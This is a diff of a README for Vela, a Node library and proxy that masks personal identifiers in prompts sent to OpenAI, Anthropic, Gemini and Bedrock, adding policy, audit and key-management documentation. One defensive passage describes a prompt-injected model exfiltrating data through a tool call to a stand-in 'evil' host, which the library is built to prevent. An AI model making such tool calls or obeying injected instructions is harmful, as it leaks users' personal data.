@@ -33,16 +33,16 @@ Rahul Sharma (PAN ABCDE1234F, Aadhaar 2345 6789 0124, +91 98765 43210, rahul@com
 | Soft PII | `[REDACTED]` | `[PERSON_1]`, `[EMAIL_2]` (reversible, JSON-safe) |
 | Multi-message requests | — | One session per request → unique placeholders across all messages |
 | Streaming | — | Per-choice / per-tool-call / per-content-block chunk-aware restoration |
-| Providers | — | OpenAI Chat Completions, OpenAI Responses, Anthropic Messages |
+| Providers | — | OpenAI Chat Completions and Responses, Anthropic Messages, Google Gemini / Vertex AI, AWS Bedrock (Converse, InvokeModel) |
 | Surfaces | — | SDK, OpenAI & Anthropic client wrappers, fetch interceptor, Express, standalone proxy, CLI |
 
 ## Project status
 
 Vela is **pre-1.0 and has not yet been independently security-reviewed**. What that means in practice:
 
-- **The encryption and restoration are well tested.** FF1 matches NIST's official vectors, and every release passes property-based tests (round-trip, no leakage, checksum validity, streaming), a labelled detection corpus and a regex denial-of-service guard on Node 18 to 24.
-- **Detection without NER is best-effort.** Structured identifiers have 100% recall on the test corpus. Names and addresses are found by heuristics and are missed in Indian scripts, for rare names and in free-form addresses (current corpus recall: about 77% for names and 71% for addresses).
-- **Recommended production setup:** the proxy or a client wrapper, a [Presidio NER service](examples/presidio/README.md) with `recognizerFailure: 'block'` (the default), and a `sessionId` per conversation.
+- **The encryption and restoration are well tested.** FF1 matches NIST's official vectors, and every release passes property-based tests (round-trip, no leakage, checksum validity, streaming), a labelled detection corpus and a regex denial-of-service guard on Node 22 and 24.
+- **Detection without NER is best-effort.** Structured identifiers are found reliably. Names and addresses are found by heuristics and are missed in Indian scripts, for rare names and in free-form addresses. [docs/DETECTION_REPORT.md](docs/DETECTION_REPORT.md) gives per-type recall with 95% confidence intervals on a 2,400-entity synthetic corpus: 86.6% for names, nearly all misses in Indic scripts. Read it as an upper bound. The hand-labelled corpus (`npm run eval`) lists the harder misses.
+- **Recommended production setup:** the proxy or a client wrapper, a policy (start from a preset), an audit sink, a [Presidio NER service](examples/presidio/README.md) with `recognizerFailure: 'block'` (the default), and a `sessionId` per conversation. See [Compliance controls](#compliance-controls) and the [compliance audit](docs/COMPLIANCE_AUDIT.md).
 - Read the [threat model](docs/THREAT_MODEL.md) for what Vela does and does not protect against, and [SECURITY.md](SECURITY.md) to report a vulnerability.
 
 ---
@@ -53,7 +53,7 @@ Vela is **pre-1.0 and has not yet been independently security-reviewed**. What t
 npm install vela-privacy
 ```
 
-Node.js ≥ 18. Ships ESM and CommonJS.
+Node.js ≥ 22. Ships ESM and CommonJS.
 
 ---
 
@@ -112,7 +112,26 @@ const anthropic = wrapAnthropicClient(new Anthropic(), new Vela());
 await anthropic.messages.create({ model: 'claude-sonnet-4-5', system: '…', messages, max_tokens: 1024, stream: true });
 ```
 
-Covers `system` (string or blocks), text blocks, `tool_use.input`, `tool_result` content and plain-text documents. Streaming handles `text_delta`, `thinking_delta` and `input_json_delta`. Use `create({ stream: true })` rather than the `messages.stream()` helper.
+Covers `system` (string or blocks), text blocks, `tool_use.input`, `tool_result` content and plain-text documents. Streaming handles `text_delta`, `thinking_delta` and `input_json_delta`. Use `create({ stream: true })`: the `messages.stream()` helper throws `VelaRouteBlockedError`. `messages.countTokens` is masked; `messages.batches.create` is blocked.
+
+### AWS Bedrock
+
+```typescript
+import { BedrockRuntimeClient, ConverseCommand } from '@aws-sdk/client-bedrock-runtime';
+import { Vela, wrapBedrockClient } from 'vela-privacy';
+
+const bedrock = wrapBedrockClient(new BedrockRuntimeClient({ region: 'ap-south-1' }), new Vela());
+await bedrock.send(new ConverseCommand({ modelId, messages }));
+```
+
+Bedrock requests are signed (SigV4), so a proxy can't change them. The wrapper masks in-process, before the SDK signs:
+- **Masked:** `Converse` and `ConverseStream` for any model; `InvokeModel` and `InvokeModelWithResponseStream` for Anthropic models.
+- **Allowed through:** `Get*` and `List*` commands.
+- **Blocked:** everything else (other models' native bodies, guardrails, async invoke). The proxy and fetch interceptor block Bedrock routes too.
+
+### Google Gemini / Vertex AI
+
+Point the Gemini client at the proxy (or use the fetch interceptor). `…:generateContent`, `…:streamGenerateContent` (JSON or `alt=sse`) and `…:countTokens` are masked and restored, including function calls. Without `--upstream`, Gemini paths go to `generativelanguage.googleapis.com`, and `--gemini-api-key` (or `VELA_GEMINI_API_KEY`) is sent as `x-goog-api-key`. `--api-key` is not sent to Gemini unless `--upstream` is set.
 
 ### Global fetch interceptor
 
@@ -129,7 +148,7 @@ Intercepts `POST …/chat/completions`, `…/responses` and `…/messages`, incl
 app.use(createExpressMiddleware(new Vela(), { upstream: 'https://api.openai.com', apiKey: process.env.OPENAI_API_KEY }));
 ```
 
-Works with or without `express.json()`. Query strings and provider headers (`anthropic-version`, `openai-organization`, …) are forwarded. `apiKey` is sent as `x-api-key` for Anthropic and as `Authorization: Bearer` otherwise.
+Works with or without `express.json()`. Query strings and provider headers (`anthropic-version`, `openai-organization`, …) are forwarded. With `upstream` set, `apiKey` goes to that upstream (as `x-api-key` for Anthropic, `x-goog-api-key` for Gemini, `Authorization: Bearer` otherwise). Without it, Anthropic and Gemini paths are routed to their own APIs and get only their own key from `apiKeys`; `apiKey` goes only to OpenAI.
 
 ### Standalone proxy & CLI
 
@@ -143,7 +162,9 @@ npx vela-privacy keygen --kem                      # full ML-KEM-768 keypair (JS
 
 Point `OPENAI_BASE_URL=http://127.0.0.1:8787/v1` (or the Anthropic SDK's `baseURL=http://127.0.0.1:8787`) at it. If you don't pass `--upstream`, Anthropic paths go to `api.anthropic.com` and everything else goes to `api.openai.com`.
 
-**Routes:** `/chat/completions`, `/responses` and `/messages` are masked and restored. `/embeddings` input is masked before forwarding. Every other route (e.g. `GET /v1/models`) is forwarded to the upstream untouched; pass `--no-passthrough` to return 404 for them instead.
+**Routes:** `/chat/completions`, `/responses` (and `/responses/input_tokens`), `/messages` (and `/messages/count_tokens`) are masked and restored. `/embeddings` and `/moderations` input and legacy `/completions` prompts are masked too. Body-free requests such as `GET /v1/models` are forwarded. **Any other route that carries a body (Message Batches, `/batches`, `/files`, audio, Assistants threads, unknown endpoints) is rejected with HTTP 403 and nothing is sent**, because Vela can't mask it. `--passthrough none` also returns 404 for body-free routes; `--passthrough all` forwards unknown routes *unmasked* and is only for operators who accept that.
+
+The client wrappers and fetch interceptor follow the same rule: methods such as `messages.countTokens`, `embeddings.create` and `responses.parse` are masked, while `batches.create`, `files.create` and the `stream()` helpers throw `VelaRouteBlockedError` instead of sending unmasked text.
 
 ---
 
@@ -221,6 +242,122 @@ await vela.maskAsync('Thiruvenkatam called');      // or let the proxy / wrapper
 
 ---
 
+## Compliance controls
+
+Vela is built to be shown to an auditor, not just switched on. Everything below works in the library, the client wrappers, the fetch interceptor and the proxy.
+
+### Policies
+
+A policy is a versioned JSON or YAML file that your DPO or compliance team can review. It sets what happens to each entity type, which providers and models requests may go to, whether images and files may leave, and which response fields get real values back. Typos are errors, not silently ignored.
+
+```yaml
+# vela.policy.yaml
+id: acme-bank-assistant
+version: 3
+packs: [pci, india-bfsi]
+entities:
+  CREDIT_CARD: block        # reject the request (HTTP 422), send nothing
+  CARD_CVV: block
+  AADHAAR: fpe-synthetic    # structure kept, check digit deliberately invalid
+  DATE_OF_BIRTH: redact     # placeholder that is never restored
+  ORG: allow                # left in clear text
+providers: { allow: ["*.openai.azure.com"] }
+models: { allow: ["gpt-4.1*"] }
+nonText: block              # images, audio, files
+restore: { toolArguments: placeholders }
+ner: { required: true }
+```
+
+```typescript
+import { Vela, loadPolicy } from 'vela-privacy';
+const vela = new Vela({ policy: loadPolicy('vela.policy.yaml') });
+```
+
+```bash
+npx vela-privacy proxy --policy vela.policy.yaml   # or a preset: --policy india-bfsi
+npx vela-privacy policy india-bfsi                 # print a preset with its hash
+```
+
+Actions are `fpe`, `fpe-synthetic`, `token`, `redact`, `block` and `allow`. Presets (`vela policies`) are starting points: `dpdp-baseline`, `india-bfsi`, `pci`, `hipaa-safe-harbor` and `gdpr-pseudonymise`. The JSON Schema in `schemas/vela-policy.schema.json` gives editors validation and completion. See [examples/policies/bank.yaml](examples/policies/bank.yaml).
+
+### Audit trail
+
+```typescript
+import { Vela, jsonlFileSink } from 'vela-privacy';
+const vela = new Vela({ policy, audit: jsonlFileSink('/var/log/vela/audit.jsonl') });
+```
+
+- **Two events per request.** A `vela.request` event is written before anything is sent, and a `vela.response` event when the response completes. Each records:
+  - the request id (also returned as `x-vela-request-id`), route, model and tenant;
+  - entity counts by type and actions taken;
+  - NER status, restore counts per field;
+  - policy id and hash, key id, latency.
+- **Rejected requests** are recorded as `vela.blocked`.
+- **No values ever.** Events never contain values, hashes of values or placeholders.
+- **Fails closed.** If the sink can't write before forwarding, the request is rejected (HTTP 503) and nothing is sent.
+- **Tamper-evident.** `jsonlFileSink` hash-chains the events, so an edited, inserted, reordered or deleted line is detected: `npx vela-privacy audit verify audit.jsonl`. Lines removed from the *end* are detected only against a head hash recorded somewhere else (`--head <hash>`), so ship the log or its head to your SIEM.
+- **Client wrappers too.** `wrapOpenAiClient` and `wrapAnthropicClient` write the same events, and fail closed the same way. The wrapped methods return plain promises, so the SDK's `.withResponse()` and `.asResponse()` helpers are not available on them.
+- **Where to keep it.** If you are subject to CERT-In's directions, keep the log in India for 180 days.
+
+### Tool calls and restoration
+
+A prompt-injected model can put a placeholder into a tool call (`http_get("https://evil/?q=[EMAIL_1]")`), and restoring it would send the real value out through the tool. With `restore: { toolArguments: 'placeholders' }` (all presets set it), tool-call arguments (including SDK `parsed_arguments` and the input of custom and code-interpreter tools) keep their placeholders while content is restored. Presets also set `thinking: 'placeholders'`: signed thinking blocks then go back to the provider exactly as it produced them. `session.restoreReport` and the audit event show how many placeholders were restored or kept in each field.
+
+### Detector packs
+
+Opt-in detectors for regulated data, each with positive and negative test cases:
+
+| Pack | Entities |
+|---|---|
+| `pci` | CVV/CVC, card expiry, magnetic-stripe track data |
+| `india-bfsi` | CKYC, UAN, demat BO ID, CIN, DIN, TAN, LEI, MICR, SWIFT/BIC, vehicle registration |
+| `health-in` | ABHA number and address, MRN/UHID |
+| `us` | ITIN, EIN, ABA routing, Medicare MBI |
+| `eu-uk` | UK NINO, NHS number, Spanish DNI/NIE, Italian codice fiscale, German Steuer-ID, French NIR |
+| `intl` | Singapore NRIC/FIN, Emirates ID, Brazilian CPF, Canadian SIN, Australian TFN |
+
+`new Vela({ packs: ['pci', 'india-bfsi'] })`, `--packs pci,india-bfsi`, or `packs:` in a policy.
+
+### Synthetic-safe identifiers
+
+By default, format-preserved Aadhaar, card, GSTIN and IBAN values pass their checksums, so a masked value could be a real third party's identifier and will trip DLP tools. The `fpe-synthetic` action keeps the structure but makes the check character invalid; types with no check character (PAN, phone) fall back to a placeholder.
+
+### Keys
+
+```typescript
+import { Vela, awsKmsKeyProvider } from 'vela-privacy';
+import { KMSClient, DecryptCommand } from '@aws-sdk/client-kms';
+
+const vela = await Vela.create({
+  keyProvider: awsKmsKeyProvider({ kms: new KMSClient({}), DecryptCommand, ciphertextBlob, kmsKeyId: 'alias/vela' }),
+});
+```
+
+- **Providers.** Adapters exist for AWS KMS, Azure Key Vault, Google Cloud KMS and HashiCorp Vault transit, plus `envKeyProvider` and a generic `envelopeKeyProvider`.
+- **No extra dependencies.** You pass your own SDK client, so Vela adds nothing to your install.
+- **Audit.** The key id goes into audit events.
+- **Rotation.** Restoration uses per-request maps, so rotating a key is just a restart.
+
+### Proxy hardening
+
+- **Authentication.** `--auth-token-file tokens.txt` takes one `<tenant> <token>` per line. Clients send `x-vela-key: <token>`.
+- **Tenants.** The tenant is recorded in audit events and bound into `x-vela-session`, so one tenant can't reproduce another's ciphertexts.
+- **Exposure.** The proxy refuses a non-loopback `--host` without tokens, unless you pass `--insecure`.
+- **Rate limits and TLS.** `--rate-limit <n>` caps requests per minute. `--tls-cert` and `--tls-key` serve HTTPS.
+
+### Deployment
+
+- `Dockerfile`: builds a non-root image that writes nothing to disk and sends audit events to stdout.
+- `deploy/helm/vela`: a Helm chart with a policy preset or inline policy, token and key Secrets, `/readyz` and `/health` probes, Prometheus annotations and a read-only root filesystem.
+- **Proxy endpoints** (all unauthenticated):
+  - `/health`: liveness;
+  - `/readyz`: checks the NER service;
+  - `/metrics`: counts only, never values.
+
+See also [docs/REGULATORY_MAPPING.md](docs/REGULATORY_MAPPING.md) for how these controls map to DPDP, CERT-In, RBI, GDPR, PCI DSS and HIPAA obligations, and [docs/DETECTION_REPORT.md](docs/DETECTION_REPORT.md) for detection accuracy.
+
+---
+
 ## Benchmarks
 
 Node.js 22, 1,000 iterations on a realistic prompt containing 7 entities:
@@ -241,7 +378,7 @@ Run `npm run benchmark` to reproduce.
 2. **Tweaks** are derived per session and per entity type, so ciphertexts can't be linked across sessions (unless you choose a shared `sessionId`) or across entity types.
 3. **Keys:** with no `fpeKey`, Vela uses a random 32-byte key per process. That's enough, because restoration uses the per-session map rather than decryption. Pass a fixed key (`vela keygen`) only if several processes must produce identical ciphertexts for the same `sessionId`.
 4. **Post-quantum key distribution (optional):** `QuantumKeyManager` uses ML-KEM-768 (FIPS 203) plus HKDF-SHA256 to agree on a shared FPE key between services, and seals keys in transit with AES-256-GCM. The sealing key gets its own HKDF label, and optional AAD is supported. The masking itself is symmetric AES-based FF1, which is not vulnerable to known quantum attacks at 256 bits.
-5. **The proxy listens on loopback by default.** If you expose it, put authentication in front of it.
+5. **The proxy listens on loopback by default** and refuses to listen beyond it without client tokens (`--auth-token-file`) unless you pass `--insecure`.
 6. **Logging** records entity counts and timings only, never values.
 7. **Input limits and NER failures fail closed.** Text longer than `maxInputChars` is rejected (HTTP 413), and a failed or timed-out async recognizer rejects the request (HTTP 503) unless you opt into `recognizerFailure: 'continue'`. In both cases nothing is sent upstream.
 
